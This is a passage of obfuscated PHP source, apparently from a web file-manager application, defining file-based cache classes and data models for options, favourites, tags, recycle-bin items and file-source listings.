remove($éÖÜõØ) { $—¤¢„êé = self::key($éÖÜõØ); unset(self::$memoryCache[$—¤¢„êé]); self::clearTimeout(); CacheLock::lock($éÖÜõØ); $óáçÏ” = self::init()->remove($—¤¢„êé); CacheLock::unlock($éÖÜõØ); return $óáçÏ”; } public static function removeMemory($½ÔÓ±‚ù) { $§¸ ¾˜“ = self::key($½ÔÓ±‚ù); unset(self::$memoryCache[$§¸ ¾˜“]); } public static function clearMemory($€‰µÉ›º = false) { if ($€‰µÉ›º) { $€‰µÉ›º = self::key($€‰µÉ›º); unset(self::$memoryCache[$€‰µÉ›º]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ú‡®¯¨±][888])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ú‡®¯¨±][889])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($èŞ‘†Öõ, $êµ…Ó™•) { $·§İÉıÆ =& $_SERVER[ú‡®¯¨±]; $this->cachePath = $èŞ‘†Öõ[$·§İÉıÆ[86]]; $this->prefix = $·§İÉıÆ[890]; $this->cacheTime = $êµ…Ó™•; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¼÷ˆ ğÛ) { $ÇìñŒ´Ò =& $_SERVER[ú‡®¯¨±]; $¼÷ˆ ğÛ = str_replace(array($ÇìñŒ´Ò[891], $ÇìñŒ´Ò[99], $ÇìñŒ´Ò[75]), $ÇìñŒ´Ò[892], $¼÷ˆ ğÛ); return $this->cachePath . $ÇìñŒ´Ò[893] . $¼÷ˆ ğÛ . $ÇìñŒ´Ò[894]; } public function set($ÌóÈ­†, $Ÿ°Ã‰“, $Ô‹÷Ï’° = false) { $Ô‹÷Ï’° = $Ô‹÷Ï’° ? $Ô‹÷Ï’° : $this->cacheTime; $¶†³Ëµä = $this->getFile($ÌóÈ­†); if (file_put_contents($¶†³Ëµä, $this->prefix . $Ÿ°Ã‰“, LOCK_EX)) { @touch($¶†³Ëµä, intval(time() + $Ô‹÷Ï’°)); clearstatcache(); return !0; } @unlink($¶†³Ëµä); return !1; } public function get($º ß¬›º) { $ìóÈõı± = $this->getFile($º ß¬›º); if (file_exists($ìóÈõı±) && filemtime($ìóÈõı±) < time()) { @unlink($ìóÈõı±); return !1; } $©’ü½ø = @file_get_contents($ìóÈõı±); return substr($©’ü½ø, strlen($this->prefix)); } public function remove($Å ãŒ‘) { $¬´’×¡À = $this->getFile($Å ãŒ‘); return @unlink($¬´’×¡À); } public function deleteAll() { $¢¥ŠªÌÈ =& $_SERVER[ú‡®¯¨±]; $ëôşúÏå = scandir($this->cachePath); foreach ($ëôşúÏå as $ÊêÖ×·È) { $ğûÍšî = $this->cachePath . $ÊêÖ×·È; if (strpos($ğûÍšî, $¢¥ŠªÌÈ[894]) && strpos($ğûÍšî, $¢¥ŠªÌÈ[895])) { @unlink($ğûÍšî); } } } public function clearTimeout() { $¡íÄÚÅ‚ =& $_SERVER[ú‡®¯¨±]; $²Í´ı’ = scandir($this->cachePath); foreach ($²Í´ı’ as $‚øãÉ») { $ºÊúòû« = $this->cachePath . $‚øãÉ»; if (strpos($ºÊúòû«, $¡íÄÚÅ‚[894]) && strpos($ºÊúòû«, $¡íÄÚÅ‚[895]) && filemtime($ºÊúòû«) < time()) { @unlink($ºÊúòû«); } } } } goto AÅÊÙëäïì; eİ¿¤¯»–Ş: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\x65\155\x4f\x70\x74\151\157\x6e"; public $field = array(); public function listData($æŒ‚Š¹Ñ = false, $™ãÅºÄ = "\155\157\x64\x69\x66\171\124\x69\155\x65", $ÂÔ ì± = false) { $äÏ°èÅ = Model($this->modelType)->get(!1, $this->optionType, !0); $ÎôÁÄ»  = array_values($äÏ°èÅ); if ($ÎôÁÄ»  && $ÎôÁÄ» [0] && !is_array($ÎôÁÄ» [0])) { Model($this->modelType)->cacheRemove($this->optionType); $äÏ°èÅ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$äÏ°èÅ) { return $æŒ‚Š¹Ñ ? null : array(); } if (!$æŒ‚Š¹Ñ) { $äÏ°èÅ = array_filter(array_values($äÏ°èÅ)); return array_sort_by($äÏ°èÅ, $™ãÅºÄ, $ÂÔ ì±); } return $äÏ°èÅ[$_SERVER[ú‡®¯¨±][450] . $æŒ‚Š¹Ñ]; } public function insert($î§ÄÉµÖ) { $¡ò¨êà÷ =& $_SERVER[ú‡®¯¨±]; $î§ÄÉµÖ = array_field_key($î§ÄÉµÖ, $this->field); $æşâÕ†€ = Model($this->modelType)->get($¡ò¨êà÷[451], $this->optionType . $¡ò¨êà÷[452]); $æşâÕ†€ = $æşâÕ†€ ? $æşâÕ†€ : 0; $î§ÄÉµÖ[$¡ò¨êà÷[453]] = ++$æşâÕ†€; $î§ÄÉµÖ[$¡ò¨êà÷[227]] = time(); $î§ÄÉµÖ[$¡ò¨êà÷[87]] = time(); Model($this->modelType)->set($¡ò¨êà÷[451], $æşâÕ†€, $this->optionType . $¡ò¨êà÷[452]); Model($this->modelType)->set($¡ò¨êà÷[450] . $æşâÕ†€, $î§ÄÉµÖ, $this->optionType); return $æşâÕ†€; } public function update($ôš¸©Ã¡, $Îó¼ÕŒò) { $‡ò¸«¬ó =& $_SERVER[ú‡®¯¨±]; $Îó¼ÕŒò = array_field_key($Îó¼ÕŒò, $this->field); $˜ø—±üª = $this->listData($ôš¸©Ã¡); if (!$˜ø—±üª || !$ôš¸©Ã¡) { return !1; } $Îó¼ÕŒò = array_merge($˜ø—±üª, $Îó¼ÕŒò); $Îó¼ÕŒò[$‡ò¸«¬ó[87]] = time(); return Model($this->modelType)->set($‡ò¸«¬ó[450] . $ôš¸©Ã¡, $Îó¼ÕŒò, $this->optionType); } public function remove($…§­Ø™) { if (!$…§­Ø™) { return !1; } return Model($this->modelType)->remove($_SERVER[ú‡®¯¨±][450] . $…§­Ø™, $this->optionType); } public function clear() { $Úö œ¶ =& $_SERVER[ú‡®¯¨±]; Model($this->modelType)->remove($Úö œ¶[451], $this->optionType . $Úö œ¶[452]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($­Åû†ò, $í³Êö­•) { if (!$í³Êö­•) { return !1; } $¿÷‹ûğÈ = $this->listData(); $¿÷‹ûğÈ = array_to_keyvalue($¿÷‹ûğÈ, $­Åû†ò); return isset($¿÷‹ûğÈ[$í³Êö­•]) ? $¿÷‹ûğÈ[$í³Êö­•] : !1; } public function findByName($Æèúèªê) { return $this->findByKey($_SERVER[ú‡®¯¨±][32], $Æèúèªê); } protected function resetData($˜”¼È÷) { $èæºÉÜ =& $_SERVER[ú‡®¯¨±]; $˜”¼È÷ = is_array($˜”¼È÷) ? $˜”¼È÷ : array(); $Ùå’­ÖÜ = array(); for ($„­«»Å© = 0; $„­«»Å© < count($˜”¼È÷); $„­«»Å©++) { $Ùå’­ÖÜ[$èæºÉÜ[450] . $˜”¼È÷[$„­«»Å©][$èæºÉÜ[453]]] = $˜”¼È÷[$„­«»Å©]; } return Model($this->modelType)->set($Ùå’­ÖÜ, !1, $this->optionType); } private function getAutoName($î©ˆ„‚«) { $Ûàš—‡ú = array_to_keyvalue($this->listData(), $_SERVER[ú‡®¯¨±][32]); if (!$Ûàš—‡ú || !isset($Ûàš—‡ú[$î©ˆ„‚«])) { return $î©ˆ„‚«; } for ($¦òõ“Å = 1; $¦òõ“Å < count($Ûàš—‡ú); $¦òõ“Å++) { $á›˜­ÓÅ = $î©ˆ„‚« . "\50{$¦òõ“Å}\51"; if (!isset($Ûàš—‡ú[$á›˜­ÓÅ])) { return $á›˜­ÓÅ; } } return $á›˜­ÓÅ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($“ìœÈ«µ = false, $×ï²µò = '', $Ì¢…å€ï = false) { $Ú ÅµÎÉ =& $_SERVER[ú‡®¯¨±]; $ÙÚ¡Ä÷´ = $this->cacheGet($×ï²µò); $©¦µÎÇü = $this->optionDefault($×ï²µò); $©¦µÎÇü = is_array($©¦µÎÇü) ? $©¦µÎÇü : array(); if (is_array($ÙÚ¡Ä÷´)) { $ÙÚ¡Ä÷´ = array_merge($©¦µÎÇü, $ÙÚ¡Ä÷´); return $“ìœÈ«µ ? isset($ÙÚ¡Ä÷´[$“ìœÈ«µ]) ? $ÙÚ¡Ä÷´[$“ìœÈ«µ] : null : $ÙÚ¡Ä÷´; } $’şç„¿ = $this->filterWhere(array($Ú ÅµÎÉ[33] => $×ï²µò)); $ÙÚ¡Ä÷´ = $this->where($’şç„¿)->select(); $ÙÚ¡Ä÷´ = array_to_keyvalue($ÙÚ¡Ä÷´, $Ú ÅµÎÉ[96], $Ú ÅµÎÉ[429]); foreach ($ÙÚ¡Ä÷´ as $¬¯†«åø => $ôãìëÏ) { if ($Ì¢…å€ï || in_array($¬¯†«åø, $this->jsonField)) { $ÙÚ¡Ä÷´[$¬¯†«åø] = json_decode($ôãìëÏ, !0); } } $this->cacheSet($×ï²µò, $ÙÚ¡Ä÷´); $ÙÚ¡Ä÷´ = array_merge($©¦µÎÇü, $ÙÚ¡Ä÷´); return $“ìœÈ«µ ? $ÙÚ¡Ä÷´[$“ìœÈ«µ] : $ÙÚ¡Ä÷´; } public function set($ÊŸ¶µ¿‰, $ùÄ×Ñ¢¨ = false, $”Å¹ãÔÚ = '') { $™Ê‰ü§À =& $_SERVER[ú‡®¯¨±]; $this->cacheRemove($”Å¹ãÔÚ); $®»òÃ®â = array(); $èõ¥ñ’ = is_array($ÊŸ¶µ¿‰) ? $ÊŸ¶µ¿‰ : array($ÊŸ¶µ¿‰ => $ùÄ×Ñ¢¨); foreach ($èõ¥ñ’ as $Ù‹ŒóøÆ => $×¤¸¨¿é) { if (is_array($×¤¸¨¿é)) { $×¤¸¨¿é = json_encode_force($×¤¸¨¿é); } $this->checkLength($×¤¸¨¿é, !1, $this->tableName . $™Ê‰ü§À[4] . $ÊŸ¶µ¿‰); $×¤¸¨¿é = self::textEncode($×¤¸¨¿é); $èõ¥ñ’ = array($™Ê‰ü§À[33] => $”Å¹ãÔÚ, $™Ê‰ü§À[96] => $Ù‹ŒóøÆ, $™Ê‰ü§À[429] => $×¤¸¨¿é); $®»òÃ®â[] = $this->filterWhere($èõ¥ñ’); } if (!$®»òÃ®â) { return !0; } $¿¹¾Úèü = $this->cacheKey($™Ê‰ü§À[454]); CacheLock::lock($¿¹¾Úèü); $§ª¬ÍíÂ = $this->addAll($®»òÃ®â, array(), !0); CacheLock::unlock($¿¹¾Úèü); return $§ª¬ÍíÂ; } protected function optionDefault($¤„·´ = '') { return !1; } public function setDeep($ôÚÛ²¯Ö, $ç¨Ëª­ = false, $¶úòíæ’ = '') { $Â§Ïƒ•¶ = explode($_SERVER[ú‡®¯¨±][10], $ôÚÛ²¯Ö); $äµ¾¨Œ = $this->get(); array_set_value($äµ¾¨Œ, $ôÚÛ²¯Ö, $ç¨Ëª­); $this->set($Â§Ïƒ•¶[0], $äµ¾¨Œ[$Â§Ïƒ•¶[0]], $¶úòíæ’); } public function remove($Ü¥‰É¬ë, $ÎĞŠ¡òŞ = '') { $øÌĞÀëÛ =& $_SERVER[ú‡®¯¨±]; $this->cacheRemove($ÎĞŠ¡òŞ); $ì”ü¬§ƒ = $this->filterWhere(array($øÌĞÀëÛ[96] => $Ü¥‰É¬ë, $øÌĞÀëÛ[33] => $ÎĞŠ¡òŞ)); if (is_null($Ü¥‰É¬ë)) { unset($ì”ü¬§ƒ[$øÌĞÀëÛ[96]]); } return $this->where($ì”ü¬§ƒ)->delete(); } public function cacheSet($Â÷Š¿È¶, $û¨æêÏæ = false) { return Cache::set($this->cacheKey($Â÷Š¿È¶), $û¨æêÏæ); } public function cacheGet($Ó”¦¨Ãï) { return Cache::get($this->cacheKey($Ó”¦¨Ãï)); } public function cacheRemove($©àÉû‚) { return Cache::remove($this->cacheKey($©àÉû‚)); } protected function filterWhere($Á‹Ş×Œ´) { return $Á‹Ş×Œ´; } protected function cacheKey($¶¡íÍ–ğ) { return $¶¡íÍ–ğ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\143\x65"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\155\x65" => "\x69\x6f\137\x73\157\x75\x72\143\x65\137\155\x65\164\141", "\x6d\x65\x74\x61\x46\x69\145\x6c\144" => "\x73\157\x75\x72\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\x54\x69\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\145\162\164", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\x63\162\145\x61\x74\145\x54\x69\x6d\145", "\x74\151\x6d\x65", "\x69\156\x73\145\162\x74", "\146\165\x6e\143\164\x69\157\156"), array("\x76\x69\145\x77\x54\151\x6d\x65", "\164\x69\155\145", "\x69\x6e\x73\145\x72\164", "\x66\165\x6e\x63\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ªÃË¯Ã£) { return $this->listSource(array($_SERVER[ú‡®¯¨±][455] => $ªÃË¯Ã£)); } public function typeName($®®©¬•Æ) { static $¦Ï›ƒá = array(self::TYPE_SYSTEM => "\x73\171\163\164\145\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $¦Ï›ƒá[$®®©¬•Æ . $_SERVER[ú‡®¯¨±][12]]; } public function sourceListInfo($æÂÒ¿İ, $¼¼Ø¾¼Ã = false) { $ı»Ğ¥Ù =& $_SERVER[ú‡®¯¨±]; $æÂÒ¿İ = $æÂÒ¿İ ? $æÂÒ¿İ : array(); $æÂÒ¿İ = array_filter(array_unique($æÂÒ¿İ)); if (!$æÂÒ¿İ) { return array(); } $‘òÈó‚‹ = $this->where(array($ı»Ğ¥Ù[183] => array($ı»Ğ¥Ù[7], $æÂÒ¿İ)))->select(); $this->_listDataApply($‘òÈó‚‹, $¼¼Ø¾¼Ã); return array_to_keyvalue($‘òÈó‚‹, $ı»Ğ¥Ù[183]); } public function pathInfoFilter(&$…ñøÆˆé) { $Ø÷ÔšŒö =& $_SERVER[ú‡®¯¨±]; static $äï×ªì¯ = false; static $Õ™ËŸÖ = false; static $™¢õ‹£ = false; if (!$äï×ªì¯) { $õ÷üşş› = $Ø÷ÔšŒö[456]; $õ÷üşş› .= $Ø÷ÔšŒö[457]; $õ÷üşş› .= $Ø÷ÔšŒö[458]; $è™‹Ò‚Å = $Ø÷ÔšŒö[459]; $‹ÏÊñøå = explode($Ø÷ÔšŒö[50], $è™‹Ò‚Å); $äï×ªì¯ = explode($Ø÷ÔšŒö[50], $õ÷üşş›); $Õ™ËŸÖ = array(); foreach ($äï×ªì¯ as $¢åò²Ìî) { if (in_array($¢åò²Ìî, $‹ÏÊñøå)) { continue; } $Õ™ËŸÖ[] = $¢åò²Ìî; } $™¢õ‹£ = explode($Ø÷ÔšŒö[50], $Ø÷ÔšŒö[460]); } foreach ($™¢õ‹£ as $·¹Ä€Ëè) { if (isset($…ñøÆˆé[$·¹Ä€Ëè])) { $…ñøÆˆé[$·¹Ä€Ëè] = intval($…ñøÆˆé[$·¹Ä€Ëè]); } } $…ñøÆˆé[$Ø÷ÔšŒö[86]] = $Ø÷ÔšŒö[461] . $…ñøÆˆé[$Ø÷ÔšŒö[183]] . $Ø÷ÔšŒö[462]; $…ñøÆˆé[$Ø÷ÔšŒö[33]] = $…ñøÆˆé[$Ø÷ÔšŒö[463]] == 1 ? $Ø÷ÔšŒö[77] : $Ø÷ÔšŒö[226]; $…ñøÆˆé[$Ø÷ÔšŒö[180]] = $this->typeName($…ñøÆˆé[$Ø÷ÔšŒö[180]]); if ($…ñøÆˆé[$Ø÷ÔšŒö[463]] != 1) { $…ñøÆˆé[$Ø÷ÔšŒö[177]] = $…ñøÆˆé[$Ø÷ÔšŒö[464]]; unset($…ñøÆˆé[$Ø÷ÔšŒö[464]]); } $âÍÏá¤õ = $äï×ªì¯; if (isset($…ñøÆˆé[$Ø÷ÔšŒö[465]]) && $…ñøÆˆé[$Ø÷ÔšŒö[465]][$Ø÷ÔšŒö[466]] == -1) { $âÍÏá¤õ = $Õ™ËŸÖ; } $…ñøÆˆé = array_field_key($…ñøÆˆé, $âÍÏá¤õ); return $…ñøÆˆé; } public function listUserFav() { $¼şş°§ =& $_SERVER[ú‡®¯¨±]; $ÆëÒòÔ = Model($¼şş°§[467])->listData(); $–¯å¦µ = array_filter_by_field($ÆëÒòÔ, $¼şş°§[33], $¼şş°§[468]); $–¯å¦µ = array_to_keyvalue($–¯å¦µ, $¼şş°§[12], $¼şş°§[86]); if ($–¯å¦µ) { $ëåßà–î = $this->listSource(array($¼şş°§[469] => array($¼şş°§[470], $–¯å¦µ))); } $ëåßà–î = array_to_keyvalue($ëåßà–î[$¼şş°§[424]], $¼şş°§[183]); foreach ($ÆëÒòÔ as &$ÃÛíÈ’…) { $ÃÛíÈ’… = array($¼şş°§[471] => $ÃÛíÈ’…[$¼şş°§[453]], $¼şş°§[472] => $ÃÛíÈ’…[$¼şş°§[32]], $¼şş°§[473] => $ÃÛíÈ’…[$¼şş°§[86]], $¼şş°§[474] => $ÃÛíÈ’…[$¼şş°§[33]], $¼şş°§[475] => $ÃÛíÈ’…[$¼şş°§[227]], $¼şş°§[476] => $ÃÛíÈ’…[$¼şş°§[87]]); if ($ÃÛíÈ’…[$¼şş°§[33]] == $¼şş°§[468] && $ëåßà–î[$ÃÛíÈ’…[$¼şş°§[86]]]) { $ÃÛíÈ’…[$¼şş°§[89]] = $ëåßà–î[$ÃÛíÈ’…[$¼şş°§[86]]]; } } unset($ÃÛíÈ’…); return $ÆëÒòÔ; } public function listUserTag($ëá…÷éÁ) { $‘“Ú™„Â =& $_SERVER[ú‡®¯¨±]; if ($ëá…÷éÁ && !is_array($ëá…÷éÁ)) { $ëá…÷éÁ = array($ëá…÷éÁ); } $ûßÃ™ã™ = Model($‘“Ú™„Â[477])->listData(); $®îŠĞşÀ = array(); $¬ØÌ Ê· = array(); foreach ($ûßÃ™ã™ as $¢Êášï¯) { $Àƒ¥µæÌ = $¢Êášï¯[$‘“Ú™„Â[86]]; if (!$Àƒ¥µæÌ) { continue; } if (!isset($¬ØÌ Ê·[$Àƒ¥µæÌ])) { $¬ØÌ Ê·[$Àƒ¥µæÌ] = array(); } $¬ØÌ Ê·[$Àƒ¥µæÌ][] = $¢Êášï¯[$‘“Ú™„Â[478]]; $®îŠĞşÀ[$¢Êášï¯[$‘“Ú™„Â[86]]] = $¢Êášï¯; } $ÍÔ¥ïäÅ = array(); $€³À÷§â = array(); $Š„ÃÑ†Ï = array(); foreach ($¬ØÌ Ê· as $’”£×— => $Æúñ™ ½) { $¼§¢•ºÌ = !0; if (!$ëá…÷éÁ) { $ÍÔ¥ïäÅ[] = $’”£×—; continue; } foreach ($ëá…÷éÁ as $¨µ£¤ºß) { if (!in_array($¨µ£¤ºß, $Æúñ™ ½)) { $¼§¢•ºÌ = !1; break; } } if (!$¼§¢•ºÌ) { continue; } if (!is_numeric($’”£×—)) { $Îç²¾œÆ = $®îŠĞşÀ[$’”£×—]; $Ş¹³±»¯ = array($‘“Ú™„Â[32] => $Îç²¾œÆ[$‘“Ú™„Â[32]], $‘“Ú™„Â[86] => $Îç²¾œÆ[$‘“Ú™„Â[86]], $‘“Ú™„Â[33] => $Îç²¾œÆ[$‘“Ú™„Â[33]], $‘“Ú™„Â[89] => array($‘“Ú™„Â[479] => 1), $‘“Ú™„Â[228] => !0); if ($Îç²¾œÆ[$‘“Ú™„Â[33]] == $‘“Ú™„Â[226]) { $Š„ÃÑ†Ï[] = $Ş¹³±»¯; } if ($Îç²¾œÆ[$‘“Ú™„Â[33]] == $‘“Ú™„Â[77]) { $€³À÷§â[] = $Ş¹³±»¯; } continue; } $ÍÔ¥ïäÅ[] = $’”£×—; } if ($ÍÔ¥ïäÅ) { $‚ÕÚ¹¸¦ = $this->listSource(array($‘“Ú™„Â[469] => array($‘“Ú™„Â[470], $ÍÔ¥ïäÅ))); } $‚ÕÚ¹¸¦ = $‚ÕÚ¹¸¦ ? $‚ÕÚ¹¸¦ : array($‘“Ú™„Â[84] => array(), $‘“Ú™„Â[85] => array()); $‚ÕÚ¹¸¦[$‘“Ú™„Â[84]] = array_merge($‚ÕÚ¹¸¦[$‘“Ú™„Â[84]], $€³À÷§â); $‚ÕÚ¹¸¦[$‘“Ú™„Â[85]] = array_merge($‚ÕÚ¹¸¦[$‘“Ú™„Â[85]], $Š„ÃÑ†Ï); if (isset($‚ÕÚ¹¸¦[$‘“Ú™„Â[421]]) && count($ÍÔ¥ïäÅ) == $‚ÕÚ¹¸¦[$‘“Ú™„Â[421]][$‘“Ú™„Â[422]]) { return $‚ÕÚ¹¸¦; } $ºÕ¥®‹ = array(); $şñ§Ç¼ = array_to_keyvalue($‚ÕÚ¹¸¦[$‘“Ú™„Â[84]], $‘“Ú™„Â[12], $‘“Ú™„Â[183]); $°È­Ø® = array_to_keyvalue($‚ÕÚ¹¸¦[$‘“Ú™„Â[85]], $‘“Ú™„Â[12], $‘“Ú™„Â[183]); $ÂëìíäÄ = array_merge($°È­Ø®, $şñ§Ç¼); foreach ($ÍÔ¥ïäÅ as $Àƒ¥µæÌ) { if (!in_array($Àƒ¥µæÌ, $ÂëìíäÄ)) { $ºÕ¥®‹[] = $Àƒ¥µæÌ; } } if ($ºÕ¥®‹) { Model($‘“Ú™„Â[480])->removeBySource($ºÕ¥®‹); } return $‚ÕÚ¹¸¦; } public function listUserRecycle() { $ğ òÜñÚ =& $_SERVER[ú‡®¯¨±]; $ğŠœµç¸ = Model($ğ òÜñÚ[481])->listData(); if (!$ğŠœµç¸) { return array(); } $›Ÿ¾®ÖŠ = array($ğ òÜñÚ[469] => array($ğ òÜñÚ[470], $ğŠœµç¸), $ğ òÜñÚ[482] => 1); return $this->listSource($›Ÿ¾®ÖŠ); } public function listSource($ÎÓ§ë¾, $³ä³£ù¡ = 3000, $”âï¬·ö = false) { $à×Ú©¿ =& $_SERVER[ú‡®¯¨±]; if (!isset($ÎÓ§ë¾[$à×Ú©¿[483]])) { $ÎÓ§ë¾[$à×Ú©¿[483]] = 0; } if (isset($ÎÓ§ë¾[$à×Ú©¿[182]]) && $ÎÓ§ë¾[$à×Ú©¿[182]] == $à×Ú©¿[224]) { $ÎÓ§ë¾[$à×Ú©¿[464]] = array($à×Ú©¿[386], $à×Ú©¿[484]); } $§•…ÄÚ = $à×Ú©¿[485]; $‚ÉæÔí© = $this->field($§•…ÄÚ)->_makeOrder()->where($ÎÓ§ë¾)->selectPage($³ä³£ù¡); $this->_listPageCheck($‚ÉæÔí©, $§•…ÄÚ, $ÎÓ§ë¾); $this->_listDataApply($‚ÉæÔí©[$à×Ú©¿[424]], $”âï¬·ö); $this->_listMake($‚ÉæÔí©); return $‚ÉæÔí©; } private function _listPageCheck(&$ĞŠô•ƒ, $ÇË¿éè¤, $èÊ¨¤Û) { $ƒÜÔÑğ =& $_SERVER[ú‡®¯¨±]; if (!is_array($ĞŠô•ƒ[$ƒÜÔÑğ[421]])) { return; } $ü…™¿û = $ĞŠô•ƒ[$ƒÜÔÑğ[421]]; if ($ü…™¿û[$ƒÜÔÑğ[423]] <= 1) { return; } if ($ü…™¿û[$ƒÜÔÑğ[422]] >= 100000) { return; } if (Model($ƒÜÔÑğ[486])->get($ƒÜÔÑğ[487]) != $ƒÜÔÑğ[488]) { return; } $ÇË¿éè¤ = str_replace(array($ƒÜÔÑğ[53], $ƒÜÔÑğ[397], $ƒÜÔÑğ[207]), $ƒÜÔÑğ[12], $ÇË¿éè¤); $ÇË¿éè¤ = $ƒÜÔÑğ[489] . str_replace($ƒÜÔÑğ[50], $ƒÜÔÑğ[490], $ÇË¿éè¤) . $ƒÜÔÑğ[491]; $«³¾Ïï¹ = $ƒÜÔÑğ[492]; $«³¾Ïï¹ = $«³¾Ïï¹ . $ƒÜÔÑğ[493]; $ôËïš÷ = $ü…™¿û[$ƒÜÔÑğ[418]] * ($ü…™¿û[$ƒÜÔÑğ[408]] - 1) . $ƒÜÔÑğ[50] . $ü…™¿û[$ƒÜÔÑğ[418]]; $ºæÈæç = $this->_makeOrder(!0); $û¦‘éÆ° = $ƒÜÔÑğ[489] . str_replace($ƒÜÔÑğ[50], $ƒÜÔÑğ[490], $ºæÈæç[0]); if (strpos($û¦‘éÆ°, $ƒÜÔÑğ[494])) { $û¦‘éÆ° = str_replace($ƒÜÔÑğ[494], $ƒÜÔÑğ[495], $û¦‘éÆ°); } else { $û¦‘éÆ° .= $ƒÜÔÑğ[496] . $ºæÈæç[1]; } $ñ§İå¹â = array(); foreach ($èÊ¨¤Û as $¢¸¯óñÉ => $ÄÎé™¡ó) { $ñ§İå¹â[$ƒÜÔÑğ[489] . $¢¸¯óñÉ] = $ÄÎé™¡ó; } $this->alias($ƒÜÔÑğ[497])->field($ÇË¿éè¤)->limit($ôËïš÷)->order($û¦‘éÆ°); $ŞÓ£ƒ¾ê = $this->join($«³¾Ïï¹)->where($ñ§İå¹â)->select(); if ($ŞÓ£ƒ¾ê) { $ĞŠô•ƒ[$ƒÜÔÑğ[424]] = $ŞÓ£ƒ¾ê; } } protected function _makeOrder($ğƒ¥€æÉ = false) { $Ù¿ÛÉÙù =& $_SERVER[ú‡®¯¨±]; $‚ÒÌÅì¸ = Model($Ù¿ÛÉÙù[498])->get($Ù¿ÛÉÙù[499]); $©Ğï‡Æã = Model($Ù¿ÛÉÙù[498])->get($Ù¿ÛÉÙù[500]); $ƒÏ¹—ñ = array($Ù¿ÛÉÙù[501] => $Ù¿ÛÉÙù[502], $Ù¿ÛÉÙù[503] => $Ù¿ÛÉÙù[504]); $ğ‚˜ëß¼ = array($Ù¿ÛÉÙù[32] => $Ù¿ÛÉÙù[32], $Ù¿ÛÉÙù[78] => $Ù¿ÛÉÙù[78], $Ù¿ÛÉÙù[177] => $Ù¿ÛÉÙù[464], $Ù¿ÛÉÙù[505] => $Ù¿ÛÉÙù[505], $Ù¿ÛÉÙù[506] => $Ù¿ÛÉÙù[507], $Ù¿ÛÉÙù[227] => $Ù¿ÛÉÙù[227], $Ù¿ÛÉÙù[87] => $Ù¿ÛÉÙù[87]); $ï¶‡¹Û˜ = Input::get($Ù¿ÛÉÙù[508], $Ù¿ÛÉÙù[7], $‚ÒÌÅì¸, array_keys($ğ‚˜ëß¼)); $ÀÅ­œ» = Input::get($Ù¿ÛÉÙù[509], $Ù¿ÛÉÙù[7], $©Ğï‡Æã, array_keys($ƒÏ¹—ñ)); if (!in_array($ï¶‡¹Û˜, array_keys($ğ‚˜ëß¼))) { $ï¶‡¹Û˜ = $Ù¿ÛÉÙù[32]; } if (!in_array($ÀÅ­œ», array_keys($ƒÏ¹—ñ))) { $ï¶‡¹Û˜ = $Ù¿ÛÉÙù[501]; } if ($ï¶‡¹Û˜ == $Ù¿ÛÉÙù[32]) { } $—ã‚‹» = $Ù¿ÛÉÙù[510] . $ğ‚˜ëß¼[$ï¶‡¹Û˜] . $Ù¿ÛÉÙù[53] . $ƒÏ¹—ñ[$ÀÅ­œ»]; $—ã‚‹» = rtrim(trim($—ã‚‹»), $Ù¿ÛÉÙù[50]); if ($ğƒ¥€æÉ) { return array($—ã‚‹», $ƒÏ¹—ñ[$ÀÅ­œ»]); } return $this->order($—ã‚‹»); } protected function _listDataApplyItem($¢·®ñÅ¿, $í‡‡¶å² = false) { $¾Ü×Š‹ü = array($¢·®ñÅ¿); $this->_listDataApply($¾Ü×Š‹ü, $í‡‡¶å²); return $¾Ü×Š‹ü[0]; } protected function _listDataApply(&$ó¥ôš¿‚, $¬ËÓËàµ = false) { $×Æ¿ñÎ– =& $_SERVER[ú‡®¯¨±]; if (!$ó¥ôš¿‚) { $ó¥ôš¿‚ = array(); return; } $êª¡…ôÉ = array_to_keyvalue($ó¥ôš¿‚, $×Æ¿ñÎ–[12], $×Æ¿ñÎ–[183]); $êª¡…ôÉ = array_unique($êª¡…ôÉ); $this->_listSourceCache($ó¥ôš¿‚); if (!$¬ËÓËàµ) { $this->_listAppendMeta($ó¥ôš¿‚, $êª¡…ôÉ); $this->_listAppendFileMeta($ó¥ôš¿‚, $êª¡…ôÉ); $this->_listAppendChildren($ó¥ôš¿‚, $êª¡…ôÉ); } $this->_listAppendPath($ó¥ôš¿‚); $this->_listAppendAuth($ó¥ôš¿‚); $this->_listAppendSourceInfo($ó¥ôš¿‚, $êª¡…ôÉ); $this->_listAppendUser($ó¥ôš¿‚); $this->_listFilterInfo($ó¥ôš¿‚, $¬ËÓËàµ); $this->_listAppendAuthSecret($ó¥ôš¿‚); } protected function _listSourceCache($ŠŞÚß«€) { $­«´¼ë« =& $_SERVER[ú‡®¯¨±]; foreach ($ŠŞÚß«€ as $à÷¢òèã) { self::$cacheSourceInfo[$­«´¼ë«[511] . $à÷¢òèã[$­«´¼ë«[183]]] = $à÷¢òèã; } } protected function _listFilterInfo(&$ôëŞöü­, $úšîĞà÷ = false) { $ñƒ»¹­Ê =& $_SERVER[ú‡®¯¨±]; foreach ($ôëŞöü­ as &$Ó¨³…ïÚ) { $Ó¨³…ïÚ = $this->pathInfoFilter($Ó¨³…ïÚ); self::$cachePathInfo[$ñƒ»¹­Ê[512] . intval($úšîĞà÷) . 